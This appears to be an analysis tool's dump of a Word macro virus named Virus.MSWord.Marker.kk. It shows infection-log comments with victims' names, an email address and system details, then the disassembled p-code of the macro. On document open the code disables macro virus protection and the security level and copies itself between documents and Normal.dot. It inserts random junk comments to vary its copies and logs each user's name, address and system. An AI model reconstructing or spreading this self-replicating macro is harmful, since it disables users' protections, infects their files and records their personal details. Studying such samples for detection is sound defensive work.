'23.04.02 20:29:05
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 7:37:18
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 9:27:41
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 11:55:10
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 11:55:56
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 12:45:19
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 12:49:48
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 14:29:25
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 14:50:29
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 19:08:17
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 20:22:36
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'24.04.02 20:49:53
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'25.04.02 6:55:10
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'25.04.02 10:06:49
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'25.04.02 10:21:48
'ÌÀÃÀËßÑ
'Windows 4.10 Pentium


'25.04.02 16:31:33
'Primak 0leg@yandex.ru
'Windows NT 4.0 Pentium


'25.04.02 17:08:47
'Äèìà
'Windows 4.10 Pentium


'21.05.02 17:36:12
'TJ 2000 TJ780611@ThePentagon.Com
'Windows 4.10 Pentium


'21.05.02 17:36:53
'TJ 2000 TJ780611@ThePentagon.Com
'Windows 4.10 Pentium


'6/7/02 3:42:21 PM
'Ditry PC
'Windows 4.0 Pentium


'6/7/02 3:42:25 PM
'Ditry PC
'Windows 4.0 Pentium

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.kk
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 245962 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	QuoteRem 0x0000 0x002C "@@yz†”I�Ÿx�t�X^m„›�vY•HŽSiwOCXUŸo}_^‹HW–hf�"
' Line #3:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #4:
' 	QuoteRem 0x0000 0x005C "@@QzžyXkhb…F›—O‘q�”i¤Šƒd£l�{�—X]’{™NQO„}jzF…ŒR‡„Yukkn‹l‚[BŠ�Ÿd—Gp}•TOˆfXf\]A�XZ‘o¡Š{ŒtR^‘Ipw"
' Line #5:
' 	Dim (Const) 
' 	LitStr 0x0015 "1234567890!@#$%^&*()_"
' 	VarDefn Marker
' Line #6:
' 	QuoteRem 0x0000 0x0056 "@@—…sk£¡CD’ŒH›o\^JzV£’^�RDz^EZ„žx��Meb�O�¤¢Vœ…T�–›Š¢£ŸvHnnnT…\�A¡sGym•¢^RRˆQwdqPŸcX |s"
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	QuoteRem 0x0000 0x0049 "@@�ŠR…^¤ts}Gz’lu€aE‰zA‹{d––{~x{Q—K[d‘£��‘€LB‡Lfa�N’’IP]B–ž—�iSŠyCtcOb…Ž_"
' Line #9:
' 	Dim 
' 	VarDefn Src
' 	VarDefn Dst (As Object)
' Line #10:
' 	QuoteRem 0x0000 0x004D "@@¤i£\D�|oŽ|ŽA aB_[FMY•fWHZ†’�‘Pf}W€D|vK…ˆUWR¢vO•˜`}aO…Yq„\SŽˆ€—…d•LwThrr_f•"
' Line #11:
' 	Dim 
' 	VarDefn S (As String)
' Line #12:
' 	QuoteRem 0x0000 0x0054 "@@n’Oiwayt^C“•W…‹‹—EHŠQw|`YQl�_{€Y—x¢‡VwKYJƒ�c�ŒvZ�’mwž~W™Oz¤~KŠ¡~x_�’]eD gŽ¤“�‰”nŠ"
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #14:
' 	QuoteRem 0x0000 0x0041 "@@PzbQ�`wzŠOV_vJ{Ž„W‘tk\Ÿm•„FoBˆz_{££ywO‡JT�Uro‰kFieiˆžpPoœK”œa’L"
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #16:
' 	QuoteRem 0x0000 0x000C "@@˜I•{†FšŽgp"
' Line #17:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0008 "Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #18:
' 	QuoteRem 0x0004 0x0025 "Îïðåäåëèì èñòî÷íèêè è ïîëó÷àòåëè òåëà"
' Line #19:
' 	Ld ThisDocument 
' 	MemLd New 
' 	LitStr 0x000A "Normal.dot"
' 	Eq 
' 	IfBlock 
' Line #20:
' 	QuoteRem 0x0000 0x0024 "@@q^›˜�ANcJLŸŽpXCiW_QP…EŒTg�mš]dK�ix"
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Dst 
' Line #22:
' 	QuoteRem 0x0000 0x0005 "@@†€t"
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Src 
' Line #24:
' 	QuoteRem 0x0000 0x002E "@@�•pK|O–aGwqSnˆOž`L^‰p\LyWj�v„[ UjJwdhM�žHEh["
' Line #25:
' 	ElseBlock 
' Line #26:
' 	QuoteRem 0x0000 0x0053 "@@•Srrž‘^liˆ�u…s‘|_d`JB™J HFŠ‰˜x“¤ŠVfA¤”ywbS‚JeYZXm�„ZŒ¤‹F�ˆ‚^Ss[�CZnNnœž{ˆwJX}w\g`"
' Line #27:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Src 
' Line #28:
' 	QuoteRem 0x0000 0x0015 "@@URpk†pr�{HO�££hbƒPp"
' Line #29:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Dst 
' Line #30:
' 	QuoteRem 0x0000 0x003B "@@“bT”¤Vz�^’{…’Mb†eB\_mb›œhdqr™eUc|mH]ajž‡`œ\gipcPk‚]Md~k›"
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	QuoteRem 0x0000 0x0045 "@@ �EC‘ŒŒLL`•”]Iœ‚Ÿ¢•\Hšpt]Žwkl–œŠoQDlkb~‡—y|Dc�bc”KD[š‰E’‘}“vŠ•`ƒ‹Ž"
' Line #33:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Dst 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #34:
' 	QuoteRem 0x0000 0x0058 "@@X~Mc˜lUŒ¡eA�™E W–a‘›iU“E{ITWtP|gOPRU[\~ƒ�j{—O|aKaƒzV|[‰OŸEP�uJœCl�~MŽDyX“šM^‚‚jE’POhk"
' Line #35:
' 	Ld Src 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Ld Src 
' 	ArgsMemCall InsertLines 0x0002 
' Line #36:
' 	QuoteRem 0x0000 0x0046 "@@�¢cO¢A�rJ`CqYŠk|`†Uk‰lMtW™U]K›e_‡`Žmwd[ljmJ•‡Z˜R¢›ŒZ�vœš�DVŽAIWyphc"
' Line #37:
' 	Ld Src 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0001 "'"
' 	ArgsLd Now 0x0000 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Src 
' 	ArgsMemCall InsertLines 0x0002 
' Line #38:
' 	QuoteRem 0x0000 0x0023 "@@FY_TpW˜R†]�ho£ iQ¢ž–™“}i‹£Q”nK[lU"
' Line #39:
' 	Ld Src 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	Ld Src 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' 	QuoteRem 0x0000 0x0032 "@@uƒ‚šWEcyW\WnT�r�Iƒ…�Ž ¢�Hh�£žt€L”ML£xVbLJJl—š�m¤"
' Line #41:
' 	Ld Src 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0001 "'"
' 	Ld System 
' 	MemLd OperatingSystem 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld System 
' 	MemLd ProcessorType 
' 	Concat 
' 	Ld Src 
' 	ArgsMemCall InsertLines 0x0002 
' Line #42:
' 	QuoteRem 0x0000 0x001D "@@}bhMTeJšv‚x�eBRN—AD\q^¡`MXŠ"
' Line #43:
' 	Ld Src 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Ld Src 
' 	ArgsMemCall InsertLines 0x0002 
' Line #44:
' 	QuoteRem 0x0000 0x0030 "@@wƒ�i AYF�zdrvTdQŽ£„bPpy�~›O�ƒ�|^Ž’ŒhA“•¤›Yo‘„x"
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Src 
' 	MemLd CountOfLines 
' 	For 
' Line #46:
' 	QuoteRem 0x0000 0x005D "@@vsW‚b\†Mrh�†j¢Z£’VweOC£‰bžDn‰X›�^dePEt“V’~‚€Kd�kiƒtsw_~kp�}dQrhl“KHTgP¤hNEKA�HunqšgUvM˜o•Y~"
' Line #47:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Src 
' 	ArgsMemLd Lines 0x0002 
' 	St S 
' Line #48:
' 	QuoteRem 0x0000 0x0016 "@@C‹TnxtB’XphS™p”“_j‚}"
' Line #49:
' 	Ld S 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	LitDI2 0x0001 
' 	Ld S 
' 	LitStr 0x0001 "'"
' 	LitDI2 0x0040 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0040 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #50:
' 	QuoteRem 0x0000 0x0030 "@@†‘s£Œžf“IˆBVZle™h”DuŒPLn„pO~ƒ`i‹”lj“rž‡”Jy•€`^"
' Line #51:
' 	LitStr 0x0001 "'"
' 	LitDI2 0x0040 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0040 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St S 
' Line #52:
' 	QuoteRem 0x0000 0x0046 "@@VsTšO\lˆZl†£~Kƒg‰Kž£ ~E¡\F’‡TU�  €‹kA`iu†vOfVB–H“^ X]ij‡yŠM€‘Tp‡tyO‚"
' Line #53:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	For 
' Line #54:
' 	QuoteRem 0x0000 0x0004 "@@QV"
' Line #55:
' 	Ld S 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St S 
' Line #56:
' 	QuoteRem 0x0000 0x0008 "@@RŒqc`ƒ"
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	QuoteRem 0x0000 0x0007 "@@BmQOU"
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	QuoteRem 0x0000 0x0048 "@@NTlJžQ‚ezKn^HF~IJB˜K˜ež’ci‰£sRœOIx‡\ky’�€¢Œ‡ŸLcLh¡qš…nQ€cHŠ—K‡irw�Dt¤¤"
' Line #61:
' 	Ld i 
' 	Ld S 
' 	Ld Dst 
' 	ArgsMemCall InsertLines 0x0002 
' Line #62:
' 	QuoteRem 0x0000 0x000F "@@¢�XMO¡A—BbWkŸ"
' Line #63:
' 	StartForVariable 
' 	Next 
' Line #64:
' 	QuoteRem 0x0000 0x0061 "@@iI„žV|qŠeˆƒ�~¡WjL�”™EJD›eU…VŸWƒo–†”h£’YS”–yLB‘ozf\€yTŽx—jD^]jnAqFCBvžxX�˜J�”‰ƒŸDeTTž¡�†Or¡˜iu‰"
' Line #65:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #66:
' 	QuoteRem 0x0000 0x0025 "@@ŸSPHDq“‚’�PJhU~P�t“bžjJ—shWnJ™^˜LN"
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	QuoteRem 0x0000 0x0056 "@@~¤nX€�„_oY”[zXM‘›Mx†oW{�b} ™–~nA–Œ˜pwˆUL „¢Ržl‘z`”\ide¡ˆrG“tX„‡DlAU]ƒ}��££s—£SagŠ"
' Line #69:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #70:
' 	QuoteRem 0x0000 0x001C "@@e‡ˆŒ”‹nPDS]t|Œ\N Y_Ša›]X‘"
' Line #71:
' 	LitStr 0x0020 "Ïîçäðàâëÿþ ñåáÿ ñ Äåíì Ðîæäåíèÿ!"
' 	Ld vbOKOnly 
' 	LitStr 0x0007 "Óðà!!!!"
' 	ArgsCall MsgBox 0x0003 
' Line #72:
' 	QuoteRem 0x0000 0x004B "@@VgŠCaeQ¢Ivty{q|‹F_‹�‹E`�£wf]tjƒ¢E_�rLl�iObUQŽšgao|]™[E�ž ŠxxbGd¢“}��\~G^G"
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	QuoteRem 0x0000 0x0050 "@@VEh^n`›D“rQ—ve“ZriV�B‰“zIqž`�Aj¡£Iˆˆ¤vQSiIl˜Bgd™˜gœ•h™qN�gk_{NŠ•ŒsSG€trcg‡š{ƒ"
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' Line #78:
' 	QuoteRem 0x0000 0x0013 "15.06.2001 15:38:13"
' Line #79:
' 	QuoteRem 0x0000 0x000F "Êàðòîõèí Ðóñëàí"
' Line #80:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #81:
' Line #82:
' Line #83:
' 	QuoteRem 0x0000 0x0013 "21.06.2001 20:05:51"
' Line #84:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #85:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #86:
' Line #87:
' Line #88:
' 	QuoteRem 0x0000 0x0013 "25.06.2001 12:50:05"
' Line #89:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #90:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #91:
' Line #92:
' Line #93:
' 	QuoteRem 0x0000 0x0013 "28.06.2001 14:21:58"
' Line #94:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #95:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #96:
' Line #97:
' Line #98:
' 	QuoteRem 0x0000 0x0013 "28.06.2001 14:48:58"
' Line #99:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #100:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #101:
' Line #102:
' Line #103:
' 	QuoteRem 0x0000 0x0013 "29.06.2001 18:00:56"
' Line #104:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #105:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #106:
' Line #107:
' Line #108:
' 	QuoteRem 0x0000 0x0013 "04.07.2001 15:08:04"
' Line #109:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #110:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #111:
' Line #112:
' Line #113:
' 	QuoteRem 0x0000 0x0013 "04.07.2001 15:09:31"
' Line #114:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #115:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #116:
' Line #117:
' Line #118:
' 	QuoteRem 0x0000 0x0013 "04.07.2001 16:29:01"
' Line #119:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #120:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #121:
' Line #122:
' Line #123:
' 	QuoteRem 0x0000 0x0013 "05.07.2001 18:46:35"
' Line #124:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #125:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #126:
' Line #127:
' Line #128:
' 	QuoteRem 0x0000 0x0013 "05.07.2001 18:47:21"
' Line #129:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #130:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #131:
' Line #132:
' Line #133:
' 	QuoteRem 0x0000 0x0013 "05.07.2001 19:42:31"
' Line #134:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #135:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #136:
' Line #137:
' Line #138:
' 	QuoteRem 0x0000 0x0013 "05.07.2001 19:42:41"
' Line #139:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #140:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #141:
' Line #142:
' Line #143:
' 	QuoteRem 0x0000 0x0013 "05.07.2001 19:42:43"
' Line #144:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #145:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #146:
' Line #147:
' Line #148:
' 	QuoteRem 0x0000 0x0013 "06.07.2001 12:48:54"
' Line #149:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #150:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #151:
' Line #152:
' Line #153:
' 	QuoteRem 0x0000 0x0013 "06.07.2001 16:48:10"
' Line #154:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #155:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #156:
' Line #157:
' Line #158:
' 	QuoteRem 0x0000 0x0011 "07.07.01 17:17:49"
' Line #159:
' 	QuoteRem 0x0000 0x0009 "Õðîìåíêîâ"
' Line #160:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #161:
' Line #162:
' Line #163:
' 	QuoteRem 0x0000 0x0011 "10.07.01 18:04:09"
' Line #164:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #165:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #166:
' Line #167:
' Line #168:
' 	QuoteRem 0x0000 0x0011 "10.07.01 18:53:01"
' Line #169:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #170:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #171:
' Line #172:
' Line #173:
' 	QuoteRem 0x0000 0x0011 "10.07.01 18:55:51"
' Line #174:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #175:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #176:
' Line #177:
' Line #178:
' 	QuoteRem 0x0000 0x0011 "10.07.01 18:56:37"
' Line #179:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #180:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #181:
' Line #182:
' Line #183:
' 	QuoteRem 0x0000 0x0011 "10.07.01 18:57:16"
' Line #184:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #185:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #186:
' Line #187:
' Line #188:
' 	QuoteRem 0x0000 0x0011 "10.07.01 18:58:20"
' Line #189:
' 	QuoteRem 0x0000 0x0003 "pvi"
' Line #190:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #191:
' Line #192:
' Line #193:
' 	QuoteRem 0x0000 0x0011 "20.07.01 10:02:22"
' Line #194:
' 	QuoteRem 0x0000 0x0005 "peter"
' Line #195:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #196:
' Line #197:
' Line #198:
' 	QuoteRem 0x0000 0x0011 "20.07.01 12:44:14"
' Line #199:
' 	QuoteRem 0x0000 0x0005 "peter"
' Line #200:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #201:
' Line #202:
' Line #203:
' 	QuoteRem 0x0000 0x0011 "20.07.01 13:34:53"
' Line #204:
' 	QuoteRem 0x0000 0x0005 "peter"
' Line #205:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #206:
' Line #207:
' Line #208:
' 	QuoteRem 0x0000 0x0011 "20.07.01 16:03:02"
' Line #209:
' 	QuoteRem 0x0000 0x0005 "peter"
' Line #210:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #211:
' Line #212:
' Line #213:
' 	QuoteRem 0x0000 0x0011 "21.07.01 20:14:33"
' Line #214:
' 	QuoteRem 0x0000 0x0005 "peter"
' Line #215:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #216:
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0011 "21.07.01 21:13:22"
' Line #219:
' 	QuoteRem 0x0000 0x0005 "peter"
' Line #220:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #221:
' Line #222:
' Line #223:
' 	QuoteRem 0x0000 0x0011 "22.07.01 15:16:25"
' Line #224:
' 	QuoteRem 0x0000 0x0005 "peter"
' Line #225:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #226:
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x0011 "22.07.01 14:56:11"
' Line #229:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #230:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #231:
' Line #232:
' Line #233:
' 	QuoteRem 0x0000 0x0011 "22.07.01 16:06:09"
' Line #234:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #235:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #236:
' Line #237:
' Line #238:
' 	QuoteRem 0x0000 0x0011 "22.07.01 16:06:52"
' Line #239:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #240:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #241:
' Line #242:
' Line #243:
' 	QuoteRem 0x0000 0x0011 "22.07.01 18:06:20"
' Line #244:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #245:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #246:
' Line #247:
' Line #248:
' 	QuoteRem 0x0000 0x0011 "22.07.01 18:06:52"
' Line #249:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #250:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #251:
' Line #252:
' Line #253:
' 	QuoteRem 0x0000 0x0011 "22.07.01 19:10:01"
' Line #254:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #255:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #256:
' Line #257:
' Line #258:
' 	QuoteRem 0x0000 0x0011 "22.07.01 19:47:31"
' Line #259:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #260:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #261:
' Line #262:
' Line #263:
' 	QuoteRem 0x0000 0x0011 "22.07.01 19:49:04"
' Line #264:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #265:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #266:
' Line #267:
' Line #268:
' 	QuoteRem 0x0000 0x0011 "22.07.01 19:53:44"
' Line #269:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #270:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #271:
' Line #272:
' Line #273:
' 	QuoteRem 0x0000 0x0011 "22.07.01 19:53:45"
' Line #274:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #275:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #276:
' Line #277:
' Line #278:
' 	QuoteRem 0x0000 0x0011 "22.07.01 19:55:44"
' Line #279:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #280:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #281:
' Line #282:
' Line #283:
' 	QuoteRem 0x0000 0x0011 "22.07.01 19:56:31"
' Line #284:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #285:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #286:
' Line #287:
' Line #288:
' 	QuoteRem 0x0000 0x0011 "22.07.01 21:03:42"
' Line #289:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #290:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #291:
' Line #292:
' Line #293:
' 	QuoteRem 0x0000 0x0011 "22.07.01 21:04:36"
' Line #294:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #295:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #296:
' Line #297:
' Line #298:
' 	QuoteRem 0x0000 0x0011 "23.07.01 18:32:02"
' Line #299:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #300:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #301:
' Line #302:
' Line #303:
' 	QuoteRem 0x0000 0x0011 "25.07.01 11:44:12"
' Line #304:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #305:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #306:
' Line #307:
' Line #308:
' 	QuoteRem 0x0000 0x0011 "27.07.01 13:09:42"
' Line #309:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #310:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #311:
' Line #312:
' Line #313:
' 	QuoteRem 0x0000 0x0011 "28.07.01 11:00:11"
' Line #314:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #315:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #316:
' Line #317:
' Line #318:
' 	QuoteRem 0x0000 0x0011 "28.07.01 11:00:14"
' Line #319:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #320:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #321:
' Line #322:
' Line #323:
' 	QuoteRem 0x0000 0x0011 "28.07.01 11:00:15"
' Line #324:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #325:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #326:
' Line #327:
' Line #328:
' 	QuoteRem 0x0000 0x0011 "28.07.01 11:10:49"
' Line #329:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #330:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #331:
' Line #332:
' Line #333:
' 	QuoteRem 0x0000 0x0011 "28.07.01 11:42:25"
' Line #334:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #335:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #336:
' Line #337:
' Line #338:
' 	QuoteRem 0x0000 0x0011 "28.07.01 11:43:44"
' Line #339:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #340:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #341:
' Line #342:
' Line #343:
' 	QuoteRem 0x0000 0x0011 "28.07.01 13:39:39"
' Line #344:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #345:
' 	QuoteRem 0x0000 0x0016 "Windows NT 4.0 Pentium"
' Line #346:
' Line #347:
' Line #348:
' 	QuoteRem 0x0000 0x0011 "28.07.01 13:40:02"
' Line #349:
' 	QuoteRem 0x0000 0x000D "Administrator"
' Line #350:
